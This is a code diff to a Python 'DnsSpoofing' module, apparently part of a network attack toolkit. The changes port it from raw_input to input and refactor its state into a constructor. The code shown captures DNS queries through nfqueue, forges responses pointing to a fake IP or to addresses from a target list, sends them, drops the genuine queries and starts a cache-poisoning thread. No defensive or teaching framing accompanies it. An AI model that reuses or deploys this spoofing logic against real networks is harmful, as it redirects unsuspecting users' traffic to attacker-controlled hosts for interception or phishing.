@@ -9,10 +9,12 @@ class DnsSpoofing(CommandModule) :
     outline = "--"
     manual = "--"
 
-    nfqueue = {}
-    dnsQueryCallback = []
-    fakeDnsIpDictionary = {}
 
+
+    def __init__(self) :
+        self.nfqueue = {}
+        self.fakeDnsIpDictionary = {}
+        self.dnsQueryCallback = [self.oneWayDnsQueryCallback, self.selectiveDnsQueryCallback]
 
 
     def run(self) :
@@ -31,9 +33,9 @@ class DnsSpoofing(CommandModule) :
         
 
         # DNS-Spoofing
-        func_id = select_dns_func();
-        if True == dnsSetup(func_id) :
-            _thread.start_new_thread(self.dnsCachePoisoning, ("DNS cache poisoning", queryID, func_id))
+        func_id = self.select_dns_func();
+        if True == self.dnsSetup(func_id) :
+            _thread.start_new_thread(self.dnsCachePoisoning, ("DNS cache poisoning", queryID, int(func_id)))
         # self.dnsCachePoisoning("DNS cache poisoning", queryID)
 
 
@@ -53,14 +55,12 @@ class DnsSpoofing(CommandModule) :
 
 
     def oneWayDnsQueryCallback(self, packet) :
-        print("# One Way DNS Query")
         pkt = IP(packet.get_payload())
-        resq = self.makeDnsResponse(pkt, self.fakeIP)
+        resq = self.makeDnsResponse(pkt, self.fakeDnsIpDictionary["fakeDns"])
         send(resq)
         packet.drop()
 
     def selectiveDnsQueryCallback(self, packet) :
-        print("# Selective DNS Query")
         pkt = IP(packet.get_payload())
         # pkt.show()
         # if pkt[DNS].qd.qname in self.fakeDnsIpDictionary.keys() :
@@ -102,16 +102,18 @@ class DnsSpoofing(CommandModule) :
         return self.nfqueue[num]
 
 
-    def dnsSetup(self, func_id) :
+    def dnsSetup(self, mode_id) :
         self.fakeDnsIpDictionary.clear()
 
-        if 0 == func_id :
+        mode = int(mode_id)
+        if 0 == mode:
             print("## Input Fake Ip.")
-            fakeIp = raw_input("fake Ip : ")
+            fakeIp = input("fake Ip : ")
             self.fakeDnsIpDictionary["fakeDns"] = fakeIp
 
-        elif 1 == func_id :
+        elif 1 == mode:
             # Get Dns Spoofing target list.
+            print("## Get DNS Spoofing List from \"./dnsSpoofingList.txt\"")
             filename = "dnsSpoofingList.txt"
             try :
                 f = open(filename, 'r')
@@ -130,7 +132,7 @@ class DnsSpoofing(CommandModule) :
         print("## Select DNS Mode.")
         print(" 0 : One Way DNS Spoofing.")
         print(" 1 : Selective DNS Spoofing.")
-        func_id = raw_input("DNS Mode : ")
+        func_id = input("DNS Mode : ")
         return func_id
 
 
